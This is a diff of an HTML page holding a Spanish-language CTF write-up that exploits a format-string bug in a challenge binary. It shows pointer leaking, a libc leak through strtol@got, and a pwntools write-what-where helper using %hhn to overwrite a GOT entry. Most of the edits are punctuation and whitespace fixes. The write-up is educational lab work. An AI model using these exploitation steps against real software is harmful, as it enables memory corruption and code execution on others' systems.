@@ -144,50 +144,50 @@
 <section class="post" id="reversing">
 <br><h3 class="post-title">Reversing</h3><br>
 
-<p class="plain-text">Si ejecutamos el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/WorldWideCTF/BufferBrawl/buffer_brawl.zip">binario</a> nos devuelve como output lo que ingresemos como input</p>
+<p class="plain-text">Si ejecutamos el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/WorldWideCTF/BufferBrawl/buffer_brawl.zip">binario</a> nos devuelve como output lo que ingresemos como input.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ./chall</span><span class="p">  
+<code><span class="ve">❯ ./chall</span><span class="p">
 >> AAAA
 AAAA
 >></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Analizaremos el funcionamiento del programa asi que iniciamos desensamblando la función <code class="language-plaintext highlighter-rouge">main</code>, esta establece que todo el stdin, stdout y stderr de redirige al <code class="language-plaintext highlighter-rouge">socket</code></p>
+<p class="plain-text">Analizaremos el funcionamiento del programa asi que iniciamos desensamblando la función <code class="language-plaintext highlighter-rouge">main</code>, esta establece que todo el stdin, stdout y stderr de redirige al <code class="language-plaintext highlighter-rouge">socket</code>.</p>
 <a href="/challenges/reverb/1.png" target="_blank"><div><p><img src="/challenges/reverb/1.png"></p></div></a>
 
-<p class="plain-text">Luego de mostrar un prompt recibe en una variable buffer <code class="language-plaintext highlighter-rouge">0x180</code> o <code class="language-plaintext highlighter-rouge">384</code> bytes con <code class="language-plaintext highlighter-rouge">fgets</code>, luego llama a la función <code class="language-plaintext highlighter-rouge">check</code> y si devuelve <code class="language-plaintext highlighter-rouge">1</code> lo devuelve con <code class="language-plaintext highlighter-rouge">printf</code> sin ningun formato, esto puede ocasionar una vulnerabilidad de tipo format string</p>
+<p class="plain-text">Luego de mostrar un prompt recibe en una variable buffer <code class="language-plaintext highlighter-rouge">0x180</code> o <code class="language-plaintext highlighter-rouge">384</code> bytes con <code class="language-plaintext highlighter-rouge">fgets</code>, luego llama a la función <code class="language-plaintext highlighter-rouge">check</code> y si devuelve <code class="language-plaintext highlighter-rouge">1</code> lo devuelve con <code class="language-plaintext highlighter-rouge">printf</code> sin ningún formato, esto puede ocasionar una vulnerabilidad de tipo format string.</p>
 <a href="/challenges/reverb/2.png" target="_blank"><div><p><img src="/challenges/reverb/2.png"></p></div></a>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">check</code> inicia definiendo un iterador <code class="language-plaintext highlighter-rouge">i</code> a <code class="language-plaintext highlighter-rouge">0</code>, luego inicia un bucle que se ejecutará mientras <code class="language-plaintext highlighter-rouge">i</code> sea menor o igual a <code class="language-plaintext highlighter-rouge">383</code>, osea toda la longitud del buffer</p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">check</code> inicia definiendo un iterador <code class="language-plaintext highlighter-rouge">i</code> a <code class="language-plaintext highlighter-rouge">0</code>, luego inicia un bucle que se ejecutará mientras <code class="language-plaintext highlighter-rouge">i</code> sea menor o igual a <code class="language-plaintext highlighter-rouge">383</code>, osea toda la longitud del buffer.</p>
 <a href="/challenges/reverb/3.png" target="_blank"><div><p><img src="/challenges/reverb/3.png"></p></div></a>
 
-<p class="plain-text">Por cada iteración accede al byte del buffer en la posición <code class="language-plaintext highlighter-rouge">i</code> y lo compara con <code class="language-plaintext highlighter-rouge">%</code>, en caso de que no se cumpla añade una unidad a <code class="language-plaintext highlighter-rouge">i</code> y vuelve nuevamente al bucle</p>
+<p class="plain-text">Por cada iteración accede al byte del buffer en la posición <code class="language-plaintext highlighter-rouge">i</code> y lo compara con <code class="language-plaintext highlighter-rouge">%</code>, en caso de que no se cumpla añade una unidad a <code class="language-plaintext highlighter-rouge">i</code> y vuelve nuevamente al bucle.</p>
 <a href="/challenges/reverb/4.png" target="_blank"><div><p><img src="/challenges/reverb/4.png"></p></div></a>
 <a href="/challenges/reverb/5.png" target="_blank"><div><p><img src="/challenges/reverb/5.png"></p></div></a>
 
-<p class="plain-text">Si encuentra el byte <code class="language-plaintext highlighter-rouge">%</code> añade una unidad a <code class="language-plaintext highlighter-rouge">counter</code> y a <code class="language-plaintext highlighter-rouge">i</code>, luego accede al byte en la posición <code class="language-plaintext highlighter-rouge">i</code> y la compara con <code class="language-plaintext highlighter-rouge">0</code>, aqui tenemos la primera de varias limitaciones</p>
+<p class="plain-text">Si encuentra el byte <code class="language-plaintext highlighter-rouge">%</code> añade una unidad a <code class="language-plaintext highlighter-rouge">counter</code> y a <code class="language-plaintext highlighter-rouge">i</code>, luego accede al byte en la posición <code class="language-plaintext highlighter-rouge">i</code> y la compara con <code class="language-plaintext highlighter-rouge">0</code>, aqui tenemos la primera de varias limitaciones.</p>
 <a href="/challenges/reverb/6.png" target="_blank"><div><p><img src="/challenges/reverb/6.png"></p></div></a>
 
-<p class="plain-text">Si pasa la condición compara si el byte se encuentra entre el rango <code class="language-plaintext highlighter-rouge">0-9</code>, ese rango es invalido y si existe simplemente sale del programa sin llegar al format string</p>
+<p class="plain-text">Si pasa la condición compara si el byte se encuentra entre el rango <code class="language-plaintext highlighter-rouge">0-9</code>, ese rango es invalido y si existe simplemente sale del programa sin llegar al format string.</p>
 <a href="/challenges/reverb/7.png" target="_blank"><div><p><img src="/challenges/reverb/7.png"></p></div></a>
 
-<p class="plain-text">Las condiciones anteriores nos dicen que luego del byte <code class="language-plaintext highlighter-rouge">%</code> al intentar explotar la vulnerabilidad no podemos acceder los datos en el rango de posiciones <code class="language-plaintext highlighter-rouge">1</code> a <code class="language-plaintext highlighter-rouge">9</code>, ni podemos anteponer el byte correspondiente a <code class="language-plaintext highlighter-rouge">0</code> en un intento de cumplirla</p>
+<p class="plain-text">Las condiciones anteriores nos dicen que luego del byte <code class="language-plaintext highlighter-rouge">%</code> al intentar explotar la vulnerabilidad no podemos acceder los datos en el rango de posiciones <code class="language-plaintext highlighter-rouge">1</code> a <code class="language-plaintext highlighter-rouge">9</code>, ni podemos anteponer el byte correspondiente a <code class="language-plaintext highlighter-rouge">0</code> en un intento de cumplirla.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ./chall</span><span class="p">  
+<code><span class="ve">❯ ./chall</span><span class="p">
 >> %1$p</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ./chall</span><span class="p">  
+<code><span class="ve">❯ ./chall</span><span class="p">
 >> %01$p</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Si pasa las 2 condiciones anteriores llama a la función <code class="language-plaintext highlighter-rouge">strtol</code> para obtener el entero que forman los <code class="language-plaintext highlighter-rouge">2</code> bytes y compara que el resultado sea menor o igual a <code class="language-plaintext highlighter-rouge">57</code></p>
+<p class="plain-text">Si pasa las 2 condiciones anteriores llama a la función <code class="language-plaintext highlighter-rouge">strtol</code> para obtener el entero que forman los <code class="language-plaintext highlighter-rouge">2</code> bytes y compara que el resultado sea menor o igual a <code class="language-plaintext highlighter-rouge">57</code>.</p>
 <a href="/challenges/reverb/8.png" target="_blank"><div><p><img src="/challenges/reverb/8.png"></p></div></a>
 
-<p class="plain-text">Esto supone una limitación bastante importante a la hora de explotar la vulnerabilidad ya que solo podemos usar un corto rango de posiciones desde la <code class="language-plaintext highlighter-rouge">10</code> hasta la <code class="language-plaintext highlighter-rouge">57</code></p>
+<p class="plain-text">Esto supone una limitación bastante importante a la hora de explotar la vulnerabilidad ya que solo podemos usar un corto rango de posiciones desde la <code class="language-plaintext highlighter-rouge">10</code> hasta la <code class="language-plaintext highlighter-rouge">57</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ./chall</span><span class="p">  
+<code><span class="ve">❯ ./chall</span><span class="p">
 >> %58$p</span>
 </code></pre></div></div><br>
 
@@ -196,7 +196,7 @@ AAAA
 <section class="post" id="exploitation">
 <br><h3 class="post-title">Explotación</h3><br>
 
-<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, el <code class="language-plaintext highlighter-rouge">NX</code> nos impedirá ejecutar un shellcode en el stack y el <code class="language-plaintext highlighter-rouge">Canary</code> establece una stack cookie en <code class="language-plaintext highlighter-rouge">rbp - 8</code>, luego compara que no se haya modificado antes del ret evitando explotaciones del stack</p>
+<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, el <code class="language-plaintext highlighter-rouge">NX</code> nos impedirá ejecutar un shellcode en el stack y el <code class="language-plaintext highlighter-rouge">Canary</code> establece una stack cookie en <code class="language-plaintext highlighter-rouge">rbp - 8</code>, luego compara que no se haya modificado antes del ret evitando explotaciones del stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ checksec </span><span class="p">chall
 [</span><span class="az">*</span><span class="p">] '/home/user/chall'
@@ -204,18 +204,18 @@ AAAA
     RELRO:      </span><span class="am">Partial RELRO</span><span class="p">
     Stack:      </span><span class="ve">Canary found</span><span class="p">
     NX:         </span><span class="ve">NX enabled</span><span class="p">
-    PIE:        </span><span class="ro">No PIE (0x3fe000)  </span>
+    PIE:        </span><span class="ro">No PIE (0x3fe000)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Sabemos que el rango válido es del <code class="language-plaintext highlighter-rouge">10</code> al <code class="language-plaintext highlighter-rouge">57</code>, entonces podemos lekear los punteros a partir del <code class="language-plaintext highlighter-rouge">10</code> usando el formato <code class="language-plaintext highlighter-rouge">%p</code>, lo haremos y veremos como se comporta</p>
+<p class="plain-text">Sabemos que el rango válido es del <code class="language-plaintext highlighter-rouge">10</code> al <code class="language-plaintext highlighter-rouge">57</code>, entonces podemos lekear los punteros a partir del <code class="language-plaintext highlighter-rouge">10</code> usando el formato <code class="language-plaintext highlighter-rouge">%p</code>, lo haremos y veremos como se comporta.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ./chall</span><span class="p">
 >> %10$p.%11$p.%12$p
-0x31252e7024303125.0x243231252e702431.0xa70  
+0x31252e7024303125.0x243231252e702431.0xa70
 >></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Probaremos enviar los punteros en las posiciones válidas una a la vez, mirando los resultados luego del 10 todos son punteros <code class="language-plaintext highlighter-rouge">null</code> y ningun leak interesante</p>
+<p class="plain-text">Probaremos enviar los punteros en las posiciones válidas una a la vez, mirando los resultados luego del 10 todos son punteros <code class="language-plaintext highlighter-rouge">null</code> y ningun leak interesante.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, log
@@ -223,7 +223,7 @@ AAAA
 shell </span><span class="o">= </span><span class="p">process(</span><span class="s">"./chall"</span><span class="p">)
 
 </span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="mi"> 58</span><span class="p">):
-    shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> f</span><span class="s">"%</span><span class="p">{i}</span><span class="s">$p"</span><span class="p">.encode())  
+    shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">,</span><span class="no"> f</span><span class="s">"%</span><span class="p">{i}</span><span class="s">$p"</span><span class="p">.encode())
     leak</span><span class="o"> =</span><span class="p"> shell.recvline().strip().decode()
 
     log.info(</span><span class="no">f</span><span class="s">"</span><span class="p">{i}</span><span class="s">:</span><span class="p"> {leak}</span><span class="s">"</span><span class="p">)
@@ -234,7 +234,7 @@ shell.interactive()</span>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> exploit.py
 [</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 1247758
-[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chall']  
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chall']
 [</span><span class="az">*</span><span class="p">] 10: 0x7024303125
 [</span><span class="az">*</span><span class="p">] 11: (nil)
 [</span><span class="az">*</span><span class="p">] 12: (nil)
@@ -258,37 +258,37 @@ shell.interactive()</span>
 >> </span><span class="ro">$</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El único puntero que nos muestra es en payload enviado en hexadecimal, lo que nos quiere decir que desde el primer puntero refleja nuestros datos y no valores del stack</p>
+<p class="plain-text">El único puntero que nos muestra es en payload enviado en hexadecimal, lo que nos quiere decir que desde el primer puntero refleja nuestros datos y no valores del stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ unhex</span><span class="p"> 7024303125 | </span><span class="ve">rev</span><span class="p">  
+<code><span class="ve">❯ unhex</span><span class="p"> 7024303125 | </span><span class="ve">rev</span><span class="p">
 %10$p</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Entonces, podemos enviar <code class="language-plaintext highlighter-rouge">%11$p</code> para hacer un leak de la posición <code class="language-plaintext highlighter-rouge">11</code> y luego rellenar con <code class="language-plaintext highlighter-rouge">.</code> a <code class="language-plaintext highlighter-rouge">8</code> bytes que es el tamaño del puntero, luego enviamos <code class="language-plaintext highlighter-rouge">AAAABBBB</code>, el resultado es que el leak muestra estos caractéres de la posición <code class="language-plaintext highlighter-rouge">11</code> como puntero</p>
+<p class="plain-text">Entonces, podemos enviar <code class="language-plaintext highlighter-rouge">%11$p</code> para hacer un leak de la posición <code class="language-plaintext highlighter-rouge">11</code> y luego rellenar con <code class="language-plaintext highlighter-rouge">.</code> a <code class="language-plaintext highlighter-rouge">8</code> bytes que es el tamaño del puntero, luego enviamos <code class="language-plaintext highlighter-rouge">AAAABBBB</code>, el resultado es que el leak muestra estos caractéres de la posición <code class="language-plaintext highlighter-rouge">11</code> como puntero.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">>> %11$p...AAAABBBB
-0x4242424241414141...AAAABBBB  
+0x4242424241414141...AAAABBBB
 >></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos aprovechar esto para hacer un leak de libc, para ello solo necesitamos la entrada <code class="language-plaintext highlighter-rouge">got</code> de la función <code class="language-plaintext highlighter-rouge">strtol</code> que contiene una referencia a su posición en libc</p>
+<p class="plain-text">Podemos aprovechar esto para hacer un leak de libc, para ello solo necesitamos la entrada <code class="language-plaintext highlighter-rouge">got</code> de la función <code class="language-plaintext highlighter-rouge">strtol</code> que contiene una referencia a su posición en libc.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> got -r strtol
 Filtering by symbol name: strtol
 
 State of the GOT of </span><span class="sa">/home/user/chall</span><span class="p">:
-GOT protection: </span><span class="am">Partial RELRO</span><span class="p"> | Found </span><span class="am">1</span><span class="p"> GOT entries passing the filter  
+GOT protection: </span><span class="am">Partial RELRO</span><span class="p"> | Found </span><span class="am">1</span><span class="p"> GOT entries passing the filter
 [</span><span class="sa">0x404030</span><span class="p">]</span><span class="am"> strtol@GLIBC_2.2.5</span><span class="p"> -> </span><span class="ro">0x401060 </span><span class="p">◂— </span><span class="na">endbr64</span><span class="p">
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">También necesitamos el offset esta la misma función pero en libc que obtenemos con <code class="language-plaintext highlighter-rouge">readelf</code>, esto para restarle esa cantidad al leak y obtener la dirección base de libc</p>
+<p class="plain-text">También necesitamos el offset esta la misma función pero en libc que obtenemos con <code class="language-plaintext highlighter-rouge">readelf</code>, esto para restarle esa cantidad al leak y obtener la dirección base de libc.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ readelf</span><span class="p"> -s libc.so.6 |</span><span class="ve"> grep</span><span class="p"> strtol@
-  1204: 00000000000474e0    22 FUNC    WEAK   DEFAULT   15 </span><span class="ro">strtol@</span><span class="p">@GLIBC_2.2.5</span>  
+  1204: 00000000000474e0    22 FUNC    WEAK   DEFAULT   15 </span><span class="ro">strtol@</span><span class="p">@GLIBC_2.2.5</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Entonces, ahora el exploit usa <code class="language-plaintext highlighter-rouge">%11$s</code> para mostrar como string el contenido de la posición <code class="language-plaintext highlighter-rouge">11</code>, rellenamos el qword y para esa posición le pasamos la entrada <code class="language-plaintext highlighter-rouge">got</code> de la función <code class="language-plaintext highlighter-rouge">strtol</code>, entonces ejecutará algún tipo de <code class="language-plaintext highlighter-rouge">printf(strtol@got)</code> que muestra la dirección de <code class="language-plaintext highlighter-rouge">strtol</code> en memoria y al restar el offset nos da la dirección base de libc</p>
+<p class="plain-text">Entonces, ahora el exploit usa <code class="language-plaintext highlighter-rouge">%11$s</code> para mostrar como string el contenido de la posición <code class="language-plaintext highlighter-rouge">11</code>, rellenamos el qword y para esa posición le pasamos la entrada <code class="language-plaintext highlighter-rouge">got</code> de la función <code class="language-plaintext highlighter-rouge">strtol</code>, entonces ejecutará algo como <code class="language-plaintext highlighter-rouge">printf(strtol@got)</code> que muestra la dirección de <code class="language-plaintext highlighter-rouge">strtol</code> en memoria y al restar el offset nos da la dirección base de libc.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64, u64, log
@@ -298,17 +298,17 @@ shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span cla
 payload</span><span class="o"> =</span><span class="no"> b</span><span class="s">"%11$s..." </span><span class="o">+ </span><span class="p">p64(</span><span class="mi">0x404030</span><span class="p">)</span><span class="c1"> # strtol@got</span><span class="p">
 shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)
 
-libc_base</span><span class="o"> =</span><span class="p"> u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">- </span><span class="mi">0x474e0</span><span class="p">  
+libc_base</span><span class="o"> =</span><span class="p"> u64(shell.recvuntil(</span><span class="no">b</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">].ljust(</span><span class="mi">8</span><span class="p">, </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00</span><span class="s">"</span><span class="p">)) </span><span class="o">- </span><span class="mi">0x474e0</span><span class="p">
 log.info(</span><span class="no">f</span><span class="s">"Libc base:</span><span class="p"> {</span><span class="no">hex</span><span class="p">(libc_base)}</span><span class="s">"</span><span class="p">)
 
 shell.interactive()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ejecutamos el exploit y nos muestra la dirección lekeada, si comparamos esta dirección con la base de libc que vemos en <code class="language-plaintext highlighter-rouge">gdb</code> es exactamente la misma</p>
+<p class="plain-text">Ejecutamos el exploit y nos muestra la dirección lekeada, si comparamos esta dirección con la base de libc que vemos en <code class="language-plaintext highlighter-rouge">gdb</code> es exactamente la misma.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
 [</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 834697
-[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chall']  
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chall']
 [</span><span class="az">*</span><span class="p">] Libc base: 0x7c488ce00000
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 >> </span><span class="ro">$</span>
@@ -328,20 +328,20 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
 </span><span class="az">►   0x7c488d015000     0x7c488d016000 ---p     1000 215000 /home/user/libc.so.6
 </span><span class="p">►   0x7c488d016000     0x7c488d01a000 r--p     4000 215000 /home/user/libc.so.6
 </span><span class="sa">►   0x7c488d01a000     0x7c488d01c000 rw-p     2000 219000 /home/user/libc.so.6
-</span><span class="p">    0x7c488d093000     0x7c488d095000 r--p     2000      0 /home/user/ld-linux-x86-64.so.2  
+</span><span class="p">    0x7c488d093000     0x7c488d095000 r--p     2000      0 /home/user/ld-linux-x86-64.so.2
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Algo a tener en cuenta es que aunque tenemos un leak de libc aun necesitamos más leaks por ejemplo del stack, para ello eliminaremos la última limitación, toma el valor de retorno de la llamada a <code class="language-plaintext highlighter-rouge">strtol</code> y compara que sea menor o igual que <code class="language-plaintext highlighter-rouge">57</code></p>
+<p class="plain-text">Algo a tener en cuenta es que aunque tenemos un leak de libc aun necesitamos más leaks por ejemplo del stack, para ello eliminaremos la última limitación, toma el valor de retorno de la llamada a <code class="language-plaintext highlighter-rouge">strtol</code> y compara que sea menor o igual que <code class="language-plaintext highlighter-rouge">57</code>.</p>
 <a href="/challenges/reverb/9.png" target="_blank"><div><p><img src="/challenges/reverb/9.png"></p></div></a>
 
-<p class="plain-text">Lo que haremos es modificar la entrada <code class="language-plaintext highlighter-rouge">got</code> de <code class="language-plaintext highlighter-rouge">strtol</code> a una función que siempre devuelva un valor de retorno bajo por ejemplo <code class="language-plaintext highlighter-rouge">getenv</code> que casi siempre devuelve <code class="language-plaintext highlighter-rouge">0</code></p>
+<p class="plain-text">Lo que haremos es modificar la entrada <code class="language-plaintext highlighter-rouge">got</code> de <code class="language-plaintext highlighter-rouge">strtol</code> a una función que siempre devuelva un valor de retorno bajo por ejemplo <code class="language-plaintext highlighter-rouge">getenv</code> que casi siempre devuelve <code class="language-plaintext highlighter-rouge">0</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ readelf </span><span class="p">-s libc.so.6 |</span><span class="ve"> grep</span><span class="p"> getenv
-  1808: 0000000000044b70   229 FUNC    GLOBAL DEFAULT   15 </span><span class="ro">getenv</span><span class="p">@@GLIBC_2.2.5  </span>
+  1808: 0000000000044b70   229 FUNC    GLOBAL DEFAULT   15 </span><span class="ro">getenv</span><span class="p">@@GLIBC_2.2.5</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Crearemos una función que escriba un <code class="language-plaintext highlighter-rouge">qword</code> en una dirección específica a través de un format string y una primitiva <code class="language-plaintext highlighter-rouge">write-what-where</code>, iniciamos creando un array con <code class="language-plaintext highlighter-rouge">8</code> tuplas que contienen la dirección donde queremos escribir el byte y el <code class="language-plaintext highlighter-rouge">byte</code> que queremos escribir, una vez lo creamos ordenaremos las tuplas usando <code class="language-plaintext highlighter-rouge">sorted</code></p>
+<p class="plain-text">Crearemos una función que escriba un <code class="language-plaintext highlighter-rouge">qword</code> en una dirección específica a través de un format string y una primitiva <code class="language-plaintext highlighter-rouge">write-what-where</code>, iniciamos creando un array con <code class="language-plaintext highlighter-rouge">8</code> tuplas que contienen la dirección donde queremos escribir el byte y el <code class="language-plaintext highlighter-rouge">byte</code> que queremos escribir, una vez lo creamos ordenaremos las tuplas usando <code class="language-plaintext highlighter-rouge">sorted</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="o">def</span><span class="na"> write</span><span class="p">(</span><span class="ra">what</span><span class="p">,</span><span class="ra"> where</span><span class="p">):
     payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
@@ -349,36 +349,36 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
     array</span><span class="o"> =</span><span class="p"> []
 
     </span><span class="o">for</span><span class="p"> i</span><span class="o"> in</span><span class="no"> range</span><span class="p">(</span><span class="mi">8</span><span class="p">):
-        array.append((where</span><span class="o"> +</span><span class="p"> i, what</span><span class="o"> &</span><span class="mi"> 0xff</span><span class="p">))  
+        array.append((where</span><span class="o"> +</span><span class="p"> i, what</span><span class="o"> &</span><span class="mi"> 0xff</span><span class="p">))
         what</span><span class="o"> >>= </span><span class="mi">8</span><span class="p">
 
     array</span><span class="o"> =</span><span class="no"> sorted</span><span class="p">(array, </span><span class="ra">key</span><span class="o">=lambda</span><span class="ra"> x</span><span class="p">: x[</span><span class="mi">1</span><span class="p">])</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Sabemos que el buffer es de <code class="language-plaintext highlighter-rouge">384</code> bytes y al final enviaremos <code class="language-plaintext highlighter-rouge">8</code> qwords de las direcciones, lo que nos deja un rango de <code class="language-plaintext highlighter-rouge">49</code> posiciones, iniciaremos ahí ya que si fuera la <code class="language-plaintext highlighter-rouge">50</code> usariamos los <code class="language-plaintext highlighter-rouge">384</code> que no nos dejaría espacio para el salto de linea</p>
+<p class="plain-text">Sabemos que el buffer es de <code class="language-plaintext highlighter-rouge">384</code> bytes y al final enviaremos <code class="language-plaintext highlighter-rouge">8</code> qwords de las direcciones, lo que nos deja un rango de <code class="language-plaintext highlighter-rouge">49</code> posiciones, iniciaremos ahí ya que si fuera la <code class="language-plaintext highlighter-rouge">50</code> usariamos los <code class="language-plaintext highlighter-rouge">384</code> que no nos dejaría espacio para el salto de línea.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">-q
->>> (49 - 10 + 8) * 8  
+>>> (49 - 10 + 8) * 8
 376
->>> (50 - 10 + 8) * 8  
+>>> (50 - 10 + 8) * 8
 384
 >>></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Entonces una vez enviamos el payload rellenamos hasta los <code class="language-plaintext highlighter-rouge">312</code> bytes para llenar las posiciones, a partir de la posición <code class="language-plaintext highlighter-rouge">49</code> enviaremos los <code class="language-plaintext highlighter-rouge">8</code> qwords de las direcciones</p>
+<p class="plain-text">Entonces una vez enviamos el payload rellenamos hasta los <code class="language-plaintext highlighter-rouge">312</code> bytes para llenar las posiciones, a partir de la posición <code class="language-plaintext highlighter-rouge">49</code> enviaremos los <code class="language-plaintext highlighter-rouge">8</code> qwords de las direcciones.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">>>> (49 - 10) * 8  
+<code><span class="p">>>> (49 - 10) * 8
 312
 >>></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Nuestro payload inicia escribiendo un payload de format string para escribir en la posición indicada con <code class="language-plaintext highlighter-rouge">%</code> partiendo desde la <code class="language-plaintext highlighter-rouge">49</code> un byte con <code class="language-plaintext highlighter-rouge">$hhn</code> que toma de la resta del valor menos los bytes escritos, luego de ello rellenamos hasta <code class="language-plaintext highlighter-rouge">312</code> bytes y finalizamos con los <code class="language-plaintext highlighter-rouge">8</code> qwords en las posiciones donde se deben escribir los bytes</p>
+<p class="plain-text">Nuestro payload inicia escribiendo un payload de format string para escribir en la posición indicada con <code class="language-plaintext highlighter-rouge">%</code> partiendo desde la <code class="language-plaintext highlighter-rouge">49</code> un byte con <code class="language-plaintext highlighter-rouge">$hhn</code> que toma de la resta del valor menos los bytes escritos, luego de ello rellenamos hasta <code class="language-plaintext highlighter-rouge">312</code> bytes y finalizamos con los <code class="language-plaintext highlighter-rouge">8</code> qwords en las posiciones donde se deben escribir los bytes.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">    written </span><span class="o">= </span><span class="mi">0</span><span class="p">
     i</span><span class="o"> =</span><span class="mi"> 49</span><span class="p">
 
     </span><span class="o">for</span><span class="p"> address, value</span><span class="o"> in</span><span class="p"> array:
-        payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (value </span><span class="o">- </span><span class="p">written)  
+        payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (value </span><span class="o">- </span><span class="p">written)
         payload</span><span class="o"> +=</span><span class="no"> f</span><span class="s">"%</span><span class="p">{i}</span><span class="s">$hhn"</span><span class="p">.encode()
 
         written </span><span class="o">= </span><span class="p">value
@@ -392,7 +392,7 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
     shell.sendlineafter(</span><span class="no">b</span><span class="s">">> "</span><span class="p">, payload)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ahora nuestro exploit luce de esta forma, luego de definir la función escribimos en la entrada <code class="language-plaintext highlighter-rouge">got</code> de <code class="language-plaintext highlighter-rouge">strtol</code> la dirección hacia la función <code class="language-plaintext highlighter-rouge">getenv</code>, esto lo podemos comprobar desde <code class="language-plaintext highlighter-rouge">gdb</code>, ahora al llamar a <code class="language-plaintext highlighter-rouge">strtol</code> en realidad llamará a <code class="language-plaintext highlighter-rouge">getenv</code></p>
